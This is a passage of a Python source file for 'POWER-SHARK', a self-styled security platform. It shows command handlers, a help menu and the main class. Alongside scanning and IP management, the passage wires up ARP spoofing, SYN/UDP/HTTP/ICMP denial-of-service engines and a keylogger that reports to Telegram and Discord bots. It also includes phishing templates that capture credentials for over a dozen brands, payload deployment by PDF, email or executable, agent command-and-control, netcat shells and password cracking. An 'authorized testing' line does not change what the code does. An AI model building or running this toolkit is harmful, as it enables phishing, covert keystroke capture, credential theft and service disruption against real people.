        result = self.arp_spoofing.start_spoof(args[0], args[1], interface)
        if result.status == "running":
            return {'success': True, 'output': f"🕸️ ARP spoofing started: {args[0]} -> {args[1]}"}
        return {'success': False, 'output': 'Failed to start ARP spoofing'}
    
    def _arp_stop(self, args):
        if not self.arp_spoofing: return {'success': False, 'output': 'ARP spoofing not initialized'}
        spoof_id = args[0] if args else None
        if self.arp_spoofing.stop_spoof(spoof_id):
            return {'success': True, 'output': 'ARP spoofing stopped'}
        return {'success': False, 'output': 'Failed to stop ARP spoofing'}
    
    def _arp_status(self, args):
        if not self.arp_spoofing: return {'success': False, 'output': 'ARP spoofing not initialized'}
        active = self.arp_spoofing.get_active_spoofs()
        if not active: return {'success': True, 'output': 'No active ARP spoofing'}
        output = "🕸️ Active ARP Spoofs:\n"
        for s in active:
            output += f"  • {s['target_ip']} -> {s['gateway_ip']}\n"
        return {'success': True, 'output': output}
    
    def _arp_history(self, args):
        if not self.arp_spoofing: return {'success': False, 'output': 'ARP spoofing not initialized'}
        limit = int(args[0]) if args else 20
        history = self.arp_spoofing.get_spoof_history(limit)
        if not history: return {'success': True, 'output': 'No ARP spoofing history'}
        output = "📋 ARP History:\n"
        for h in history:
            output += f"  • {h['target_ip']} -> {h['gateway_ip']} ({h['status']})\n"
        return {'success': True, 'output': output}
    
    def _arp_scan(self, args):
        return self._generic('arp -a')
    
    # MAC
    def _mac_info(self, args):
        if not self.mac_manager: return {'success': False, 'output': 'MAC manager not initialized'}
        if not args: return {'success': False, 'output': 'Usage: mac_info <mac_address>'}
        info = self.mac_manager.get_mac_info(args[0])
        output = f"📡 MAC Information:\n"
        output += f"  MAC: {info.get('mac_address', 'Unknown')}\n"
        output += f"  Vendor: {info.get('vendor', 'Unknown')}\n"
        output += f"  IP: {info.get('ip_address', 'Unknown')}\n"
        output += f"  Hostname: {info.get('hostname', 'Unknown')}\n"
        return {'success': True, 'output': output}
    
    def _mac_scan(self, args):
        if not self.mac_manager: return {'success': False, 'output': 'MAC manager not initialized'}
        network = args[0] if args else None
        results = self.mac_manager.scan_network(network)
        if not results: return {'success': True, 'output': 'No devices found'}
        output = "📡 Network MAC Scan:\n"
        for r in results:
            output += f"  • {r['ip_address']} - {r['mac_address']} ({r['vendor']})\n"
        return {'success': True, 'output': output}
    
    def _mac_vendor(self, args):
        if not args: return {'success': False, 'output': 'Usage: mac_vendor <mac>'}
        vendor = self.tools.get_mac_vendor(args[0])
        if vendor: return {'success': True, 'output': f"Vendor: {vendor}"}
        return {'success': False, 'output': 'Could not determine vendor'}
    
    # NAT
    def _nat_info(self, args):
        if not self.nat_info: return {'success': False, 'output': 'NAT info not initialized'}
        info = self.nat_info.get_nat_info()
        output = f"🌐 NAT Information:\n"
        output += f"  Public IP: {info.public_ip}\n"
        output += f"  Private IP: {info.private_ip}\n"
        output += f"  Router IP: {info.router_ip}\n"
        output += f"  Country: {info.country}\n"
        output += f"  ISP: {info.isp}\n"
        output += f"  NAT Type: {info.nat_type}\n"
        return {'success': True, 'output': output}
    
    def _nat_public(self, args):
        if not self.nat_info: return {'success': False, 'output': 'NAT info not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Public IP: {info.public_ip}"}
    
    def _nat_private(self, args):
        if not self.nat_info: return {'success': False, 'output': 'NAT info not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Private IP: {info.private_ip}"}
    
    def _nat_router(self, args):
        if not self.nat_info: return {'success': False, 'output': 'NAT info not initialized'}
        info = self.nat_info.get_nat_info()
        return {'success': True, 'output': f"Router IP: {info.router_ip}"}
    
    # Docker
    def _docker_scan(self, args):
        if not self.docker_scanner: return {'success': False, 'output': 'Docker scanner not initialized'}
        if not args: return {'success': False, 'output': 'Usage: docker_scan <image>'}
        result = self.docker_scanner.scan_image(args[0])
        if result['success']:
            output = f"🐳 Docker scan of {args[0]} completed\n"
            output += f"  Severity: {result.get('severity', 'unknown')}\n"
            output += f"  Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Scan failed')}
    
    def _docker_info(self, args):
        if not self.docker_scanner: return {'success': False, 'output': 'Docker scanner not initialized'}
        r = self.docker_scanner.docker_info()
        return {'success': r['success'], 'output': r['output']}
    
    def _docker_ps(self, args):
        if not self.docker_scanner: return {'success': False, 'output': 'Docker scanner not initialized'}
        r = self.docker_scanner.docker_ps()
        return {'success': r['success'], 'output': r['output']}
    
    def _docker_images(self, args):
        if not self.docker_scanner: return {'success': False, 'output': 'Docker scanner not initialized'}
        r = self.docker_scanner.docker_images()
        return {'success': r['success'], 'output': r['output']}
    
    def _docker_bench(self, args):
        if not self.docker_scanner: return {'success': False, 'output': 'Docker scanner not initialized'}
        r = self.docker_scanner.docker_bench()
        return {'success': r['success'], 'output': r['output']}
    
    # Email
    def _email_compose(self, args):
        if not self.email_composer: return {'success': False, 'output': 'Email composer not initialized'}
        if len(args) < 3: return {'success': False, 'output': 'Usage: email_compose <to> <subject> <body>'}
        self.email_composer.compose_email(args[0], args[1], ' '.join(args[2:]))
        return {'success': True, 'output': f"📧 Email composed for {args[0]}\nUse 'email_list' to see draft, then 'email_send <id>'"}
    
    def _email_send(self, args):
        if not self.email_composer: return {'success': False, 'output': 'Email composer not initialized'}
        if not args: return {'success': False, 'output': 'Usage: email_send <email_id>'}
        result = self.email_composer.send_email(int(args[0]))
        if result['success']:
            return {'success': True, 'output': f"📧 Email sent: {result['message']}"}
        return {'success': False, 'output': f"Failed: {result.get('error')}"}
    
    def _email_list(self, args):
        if not self.email_composer: return {'success': False, 'output': 'Email composer not initialized'}
        status = args[0] if args and args[0] in ['draft', 'sent', 'failed'] else None
        emails = self.email_composer.get_emails(status, 20)
        if not emails: return {'success': True, 'output': 'No emails found'}
        output = "📧 Emails:\n"
        for e in emails:
            output += f"  • ID {e['id']} - To: {e['to_address']} - Status: {e['status']}\n"
        return {'success': True, 'output': output}
    
    def _email_delete(self, args):
        if not self.email_composer: return {'success': False, 'output': 'Email composer not initialized'}
        if not args: return {'success': False, 'output': 'Usage: email_delete <email_id>'}
        if self.email_composer.delete_email(int(args[0])):
            return {'success': True, 'output': f"Email {args[0]} deleted"}
        return {'success': False, 'output': f"Failed to delete email {args[0]}"}
    
    # PDF
    def _report_generate(self, args):
        if not self.pdf_report: return {'success': False, 'output': 'PDF report generator not initialized'}
        if len(args) < 2: return {'success': False, 'output': 'Usage: report_generate <title> <target>'}
        analysis = {
            'target': args[1],
            'timestamp': datetime.datetime.now().isoformat(),
            'recommendations': [
                'Review all open ports and close unnecessary services',
                'Update all software to latest versions',
                'Implement network segmentation'
            ]
        }
        result = self.pdf_report.generate_report(args[0], args[1], analysis)
        if result['success']:
            return {'success': True, 'output': f"📊 PDF Report generated: {result['file_path']}"}
        return {'success': False, 'output': f"Failed: {result.get('error')}"}
    
    def _report_list(self, args):
        if not self.pdf_report: return {'success': False, 'output': 'PDF report generator not initialized'}
        reports = self.pdf_report.get_reports(20)
        if not reports: return {'success': True, 'output': 'No reports found'}
        output = "📊 PDF Reports:\n"
        for r in reports:
            output += f"  • {r['title']} - {r['target']}\n"
        return {'success': True, 'output': output}
    
    # Monitor
    def _monitor_start(self, args):
        return {'success': True, 'output': 'Threat monitoring started'}
    
    def _monitor_stop(self, args):
        return {'success': True, 'output': 'Threat monitoring stopped'}
    
    def _monitor_add(self, args):
        if len(args) < 2: return {'success': False, 'output': 'Usage: monitor_add <target> <scan_type> [interval]'}
        interval = int(args[2]) if len(args) > 2 else 300
        if self.db.add_threat_monitor(args[0], args[1], interval):
            return {'success': True, 'output': f"Monitor added for {args[0]} ({args[1]}) every {interval}s"}
        return {'success': False, 'output': 'Failed to add monitor'}
    
    def _monitor_status(self, args):
        monitors = self.db.get_threat_monitors(enabled_only=False)
        output = f"📊 Threat Monitor Status:\n  Monitors: {len(monitors)}\n"
        return {'success': True, 'output': output}
    
    def _monitor_list(self, args):
        monitors = self.db.get_threat_monitors(enabled_only=False)
        if not monitors: return {'success': True, 'output': 'No monitors configured'}
        output = "📊 Threat Monitors:\n"
        for m in monitors:
            output += f"  • {m['target']} - {m['scan_type']} (every {m['interval']}s)\n"
        return {'success': True, 'output': output}
    
    # Scan
    def _scan(self, args):
        if not args: return {'success': False, 'output': 'Usage: scan <target>'}
        r = self.tools.nmap(args[0], 'quick')
        return {'success': r.success, 'output': r.output}
    
    def _quick_scan(self, args):
        if not args: return {'success': False, 'output': 'Usage: quick_scan <target>'}
        r = self.tools.nmap(args[0], 'quick')
        return {'success': r.success, 'output': r.output}
    
    def _full_scan(self, args):
        if not args: return {'success': False, 'output': 'Usage: full_scan <target>'}
        r = self.tools.nmap(args[0], 'full')
        return {'success': r.success, 'output': r.output}
    
    # IP Management
    def _add_ip(self, args):
        if not args: return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        domain = self.tools.ip_to_domain(args[0])
        try:
            ipaddress.ip_address(args[0])
            if self.db.add_managed_ip(args[0], domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {args[0]} added (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {args[0]}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {args[0]}'}
    
    def _remove_ip(self, args):
        if not args: return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (args[0],))
        self.db.conn.commit()
        return {'success': True, 'output': f'✅ IP {args[0]} removed'}
    
    def _block_ip(self, args):
        if not args: return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        firewall_success = self.tools.block_ip(args[0])
        db_success = self.db.block_ip(args[0], reason)
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔒 IP {args[0]} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {args[0]}'}
    
    def _unblock_ip(self, args):
        if not args: return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        firewall_success = self.tools.unblock_ip(args[0])
        db_success = self.db.unblock_ip(args[0])
        if firewall_success or db_success:
            return {'success': True, 'output': f'🔓 IP {args[0]} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {args[0]}'}
    
    def _list_ips(self, args):
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips: return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            output += f"  {status} {ip['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args):
        if not args: return {'success': False, 'output': 'Usage: ip_info <ip>'}
        try:
            ipaddress.ip_address(args[0])
            location = self.tools.location(args[0])
            domain = self.tools.ip_to_domain(args[0])
            output = f"🔍 IP Information: {args[0]}\n"
            if domain: output += f"  Domain: {domain}\n"
            if location.get('success'):
                output += f"  Location: {location.get('country')}, {location.get('city')}\n"
                output += f"  ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {args[0]}'}
    
    def _analyze_ip(self, args):
        if not args: return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = self.tools.ip_to_domain(ip)
        output = f"🦈 POWER-SHARK IP Analysis: {ip}\n" + "=" * 50 + "\n\n"
        if domain: output += f"🌐 Domain: {domain}\n\n"
        output += "📡 Ping Results:\n" + ping_result.output[:500] + "\n\n"
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        output += "🔍 Port Scan:\n" + nmap_result.output[:1000]
        return {'success': True, 'output': output}
    
    # System
    def _status(self, args):
        stats = self.db.get_statistics()
        output = f"""
🦈 POWER-SHARK System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  Domain Hosts: {stats.get('total_domain_hosts', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Deployments: {stats.get('total_deployments', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  ARP Spoofs: {stats.get('total_arp_spoofs', 0)}
  MAC Entries: {stats.get('total_mac_entries', 0)}
  NAT Entries: {stats.get('total_nat_entries', 0)}
  Emails: {stats.get('total_emails', 0)}
  PDF Reports: {stats.get('total_pdf_reports', 0)}
  Monitors: {stats.get('total_monitors', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {self.tools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args):
        limit = int(args[0]) if args and args[0].isdigit() else 20
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history: return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args):
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args):
        limit = int(args[0]) if args and args[0].isdigit() else 10
        threats = self.db.get_recent_threats(limit)
        if not threats: return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            output += f"  • {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _report(self, args):
        stats = self.db.get_statistics()
        report = f"""
🦈 POWER-SHARK Security Report
{'='*50}
Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
"""
        filename = f"report_{int(time.time())}.txt"
        filepath = os.path.join(REPORT_DIR, filename)
        with open(filepath, 'w') as f:
            f.write(report)
        return {'success': True, 'output': report + f"\n\n📁 Report saved: {filepath}"}
    
    def _clear(self, args):
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _version(self, args):
        return {'success': True, 'output': f"POWER-SHARK v{VERSION}\nAuthor: {AUTHOR}"}
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args):
        help_text = f"""
{Colors.WHITE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        🦈 POWER-SHARK v{VERSION} - CYBER COMMAND PLATFORM                   {Colors.WHITE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SUCCESS}📡 PING:{Colors.RESET}
║  ping <target> [count]           ping6 <target>          ping_sweep <network>
║  fping <targets...>              ping_flood <target>     ping_timeout <target> <sec>
║  ping_size <target> <size>       ping_interval <target> <sec>
║
║{Colors.SUCCESS}🔍 NMAP:{Colors.RESET}
║  nmap <target>          nmap_quick <target>       nmap_full <target>
║  nmap_os <target>       nmap_service <target>     nmap_udp <target>
║  nmap_vuln <target>     nmap_stealth <target>     nmap_ping <target>
║  nmap_script <target> <script>   nmap_aggressive <target>
║
║{Colors.SUCCESS}🗺️ TRACEROUTE:{Colors.RESET}
║  traceroute <target>    tracert <target>          tracepath <target>
║  mtr <target>           tcptraceroute <target>    traceroute_udp <target>
║  traceroute_icmp <target>
║
║{Colors.SUCCESS}⬇️ WGET:{Colors.RESET}
║  wget <url> [output]    wget_recursive <url>      wget_mirror <url>
║  wget_continue <url>    wget_limit <url> <rate>   wget_post <url> <data>
║
║{Colors.SUCCESS}🌐 CURL:{Colors.RESET}
║  curl <url>             curl_post <url> <data>    curl_head <url>
║  curl_auth <url> <user> <pass>    curl_follow <url>   curl_verbose <url>
║
║{Colors.SUCCESS}🔌 NETCAT:{Colors.RESET}
║  netcat <host> <port>   nc_listen <port>          nc_scan <host> <ports>
║  nc_transfer <host> <port> <file>     nc_shell <host> <port>
║
║{Colors.SUCCESS}🔒 SSH:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass]     ssh_list     ssh_connect <conn_id>
║  ssh_exec <conn_id> <command>            ssh_disconnect <conn_id>
║
║{Colors.SUCCESS}🚀 TRAFFIC:{Colors.RESET}
║  traffic <type> <ip> <duration> [port] [rate]       traffic_types
║  traffic_status         traffic_stop [id]           traffic_icmp <ip> <duration>
║  traffic_tcp <ip> <port> <duration>    traffic_udp <ip> <port> <duration>
║
║{Colors.SUCCESS}🕷️ NIKTO:{Colors.RESET}
║  nikto <target>         nikto_full <target>        nikto_ssl <target>
║  nikto_port <target> <port>          nikto_tuning <target> <tuning>
║
║{Colors.SUCCESS}💥 DOS:{Colors.RESET}
║  dos_syn <ip> <port> <duration> [threads]    dos_udp <ip> <port> <duration>
║  dos_http <ip> <port> <duration>    dos_icmp <ip> <duration>
║  dos_stop [id]          dos_status
║
║{Colors.SUCCESS}🤖 AGENT:{Colors.RESET}
║  agent_register <name> <ip>          agent_command <id> <command>
║  agent_list             agent_status <id>
║
║{Colors.SUCCESS}📡 NETMON:{Colors.RESET}
║  netmon_start           netmon_stop                netmon_status
║  netmon_packets [limit] netmon_stats
║
║{Colors.SUCCESS}⌨️ KEYLOGGER:{Colors.RESET}
║  keylogger_start        keylogger_stop             keylogger_status
║  keylogger_logs [limit] keylogger_clipboard [limit]
║
║{Colors.SUCCESS}📦 DEPLOY:{Colors.RESET}
║  deploy_pdf <name> <target> <url>    deploy_email <name> <target> <subject> <body> <url>
║  deploy_link <name> <target> <url>   deploy_executable <name> <target> <server>
║  deploy_list            deploy_track <id>
║
║{Colors.SUCCESS}🌐 DOMAIN:{Colors.RESET}
║  ip_to_domain <ip>      domain_to_ip <domain>
║  host_domain <ip> <domain> [port]    list_domains
║
║{Colors.SUCCESS}🎣 SOCIAL ENGINEERING (100+ Templates):{Colors.RESET}
║  phish_facebook         phish_instagram            phish_twitter
║  phish_gmail            phish_linkedin             phish_microsoft
║  phish_google           phish_apple                phish_paypal
║  phish_amazon           phish_netflix              phish_spotify
║  phish_whatsapp         phish_telegram             phish_discord
║  phish_github           phish_slack                phish_steam
║  phish_start <link_id> [port]    phish_stop         phish_creds [link_id]
║
║{Colors.SUCCESS}🔓 CRACKING:{Colors.RESET}
║  crack <hash_type> <hash> [wordlist]     crack_status <job_id>
║  crack_list             crack_md5 <hash>            crack_sha1 <hash>
║  crack_sha256 <hash>    crack_ntlm <hash>
║
║{Colors.SUCCESS}🕸️ ARP:{Colors.RESET}
║  arp_spoof <target> <gateway> [interface]    arp_stop [id]
║  arp_status             arp_history [limit]         arp_scan
║
║{Colors.SUCCESS}📡 MAC:{Colors.RESET}
║  mac_info <mac>         mac_scan [network]         mac_vendor <mac>
║
║{Colors.SUCCESS}🌐 NAT:{Colors.RESET}
║  nat_info               nat_public                nat_private
║  nat_router
║
║{Colors.SUCCESS}🐳 DOCKER:{Colors.RESET}
║  docker_scan <image>    docker_info               docker_ps
║  docker_images          docker_bench
║
║{Colors.SUCCESS}📧 EMAIL:{Colors.RESET}
║  email_compose <to> <subject> <body>    email_send <email_id>
║  email_list [status]    email_delete <email_id>
║
║{Colors.SUCCESS}📊 PDF REPORT:{Colors.RESET}
║  report_generate <title> <target>       report_list
║
║{Colors.SUCCESS}📊 THREAT MONITOR:{Colors.RESET}
║  monitor_start          monitor_stop              monitor_add <target> <type> [interval]
║  monitor_status         monitor_list
║
║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]    remove_ip <ip>            block_ip <ip> [reason]
║  unblock_ip <ip>        list_ips [active]         ip_info <ip>
║  analyze_ip <ip>
║
║{Colors.SUCCESS}📊 SYSTEM:{Colors.RESET}
║  status                 history [limit]            system
║  threats [limit]        report                    clear
║  version                help
║
║{Colors.WHITE}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# MAIN APPLICATION
# =====================
class PowerShark:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.tools = NetworkTools()
        
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.nikto = NiktoScanner(self.db)
        self.dos = DOSEngine(self.db, self.config)
        self.agent = AgentEngine(self.db, self.config)
        self.network_monitor = NetworkMonitor(self.db, self.config)
        self.keylogger = KeyloggerEngine(self.db, self.config) if PYNPUT_AVAILABLE else None
        self.deployment = DeploymentEngine(self.db, self.config)
        self.domain_hosting = DomainHostingEngine(self.db, self.config)
        self.cracking = CrackingEngine(self.db, self.config)
        self.arp_spoofing = ARPSpoofingEngine(self.db, self.config) if SCAPY_AVAILABLE else None
        self.mac_manager = MACManager(self.db)
        self.nat_info = NATInfoEngine(self.db)
        self.docker_scanner = DockerScanner(self.db)
        self.social = SocialEngineeringTools(self.db)
        self.email_composer = EmailComposerEngine(self.db, self.config)
        self.pdf_report = PDFReportGenerator(self.db, self.config)
        
        self.discord = DiscordBot(None, self.db)
        self.telegram = TelegramBot(None, self.db)
        self.slack = SlackBot(None, self.db)
        self.signal = SignalBot(None, self.db)
        self.google_chat = GoogleChatBot(None, self.db)
        
        self.handler = CommandHandler(
            self.db, self.ssh, self.traffic, self.nikto,
            self.dos, self.agent, self.network_monitor,
            self.keylogger, self.deployment, self.domain_hosting,
            self.cracking, self.arp_spoofing, self.mac_manager,
            self.nat_info, self.email_composer, self.pdf_report,
            self.docker_scanner
        )
        
        self.discord.handler = self.handler
        self.telegram.handler = self.handler
        self.slack.handler = self.handler
        self.signal.handler = self.handler
        self.google_chat.handler = self.handler
        
        if self.keylogger:
            self.keylogger.set_telegram_bot(self.telegram)
            self.keylogger.set_discord_bot(self.discord)
        
        self.web = WebDashboard(self.handler, self.db, self.config)
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.WHITE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.WHITE}        🦈 POWER-SHARK v{VERSION} - CYBER COMMAND PLATFORM                   {Colors.WHITE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.WHITE}                                                                           {Colors.WHITE}║
║{Colors.SUCCESS}  • 🦈 200+ Security Commands         • 📡 All Ping Commands           {Colors.WHITE}║
║{Colors.SUCCESS}  • 🗺️ All Traceroute Commands        • 🔍 All Nmap Commands          {Colors.WHITE}║
║{Colors.SUCCESS}  • ⬇️ All Wget Commands              • 🌐 All Curl Commands          {Colors.WHITE}║
║{Colors.SUCCESS}  • 🔌 SSH Remote Command Execution    • 🚀 REAL Traffic Generation    {Colors.WHITE}║
║{Colors.SUCCESS}  • 🕷️ Nikto Web Vulnerability Scanner  • 🎣 Social Engineering Suite   {Colors.WHITE}║
║{Colors.SUCCESS}  • ⌨️ Advanced Keylogger (F10)         • 💥 DOS Attack Capabilities    {Colors.WHITE}║
║{Colors.SUCCESS}  • 📧 Email Composition              • 🤖 Agent Command & Control    {Colors.WHITE}║
║{Colors.SUCCESS}  • 📱 Multi-Platform Bot Integration  • 💻 Web Dashboard              {Colors.WHITE}║
║{Colors.SUCCESS}  • Discord | Telegram | Slack         • Signal | Google Chat          {Colors.WHITE}║
║{Colors.SUCCESS}  • 🔒 IP Management & Threat Detection • 🌐 IP to Domain Translation   {Colors.WHITE}║
║{Colors.SUCCESS}  • 🏠 Domain Hosting Engine           • 📊 PDF Report Generation      {Colors.WHITE}║
║{Colors.SUCCESS}  • 📡 Network Monitoring               • 🔐 Agent Mode                 {Colors.WHITE}║
║{Colors.SUCCESS}  • 📦 PDF/Email/Link Deployment       • 🔑 Clipboard/SSH Key Capture  {Colors.WHITE}║
║{Colors.SUCCESS}  • 🔓 Password Cracking Engine        • 🐳 Docker Security Scanning   {Colors.WHITE}║
║{Colors.SUCCESS}  • 📡 MAC Address Management          • 🌐 NAT Information            {Colors.WHITE}║
║{Colors.SUCCESS}  • 🕸️ ARP Spoofing                    • 📊 Threat Monitoring        {Colors.WHITE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.WHITE}                    🎯 ACCURATE CYBER DEFENSE                     {Colors.WHITE}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SUCCESS}🦈 Welcome to POWER-SHARK - Your Ultimate Security Assistant{Colors.RESET}
{Colors.WHITE}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.WHITE}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.WHITE}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.WHITE}📧 Use 'email_compose' to compose and send emails{Colors.RESET}
{Colors.WHITE}📊 Use 'report_generate' to generate PDF reports{Colors.RESET}
{Colors.WHITE}🔓 Use 'crack' commands for password cracking{Colors.RESET}
{Colors.WHITE}🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}
{Colors.WHITE}📡 Use 'mac_info' for MAC address information{Colors.RESET}
{Colors.WHITE}🌐 Use 'nat_info' for NAT information{Colors.RESET}
{Colors.WHITE}📊 Use 'monitor_add' to start threat monitoring{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.WHITE}🔍 Checking dependencies...{Colors.RESET}")
        tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh', 'wget', 'docker', 'whois']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic/ARP disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WEB_AVAILABLE else Colors.WARNING}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if PYNPUT_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if PYNPUT_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DNS_AVAILABLE else Colors.WARNING}✅ dnspython{Colors.RESET}" if DNS_AVAILABLE else f"{Colors.WARNING}⚠️ dnspython not found - DNS features limited{Colors.RESET}")
        print(f"{Colors.SUCCESS if PDF_AVAILABLE else Colors.WARNING}✅ reportlab{Colors.RESET}" if PDF_AVAILABLE else f"{Colors.WARNING}⚠️ reportlab not found - PDF reports disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if TELETHON_AVAILABLE else Colors.WARNING}✅ telethon{Colors.RESET}" if TELETHON_AVAILABLE else f"{Colors.WARNING}⚠️ telethon not found - Telegram disabled{Colors.RESET}")
        
        if self.nikto.available:
            print(f"{Colors.SUCCESS}✅ nikto{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ nikto not found - web scanning disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.WHITE}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.WHITE}{'='*50}{Colors.RESET}")
        
        setup = input(f"{Colors.WHITE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.WHITE}Enter Discord bot token: {Colors.RESET}").strip()
            if token:
                self.discord.save_config(token)
                if self.discord.setup():
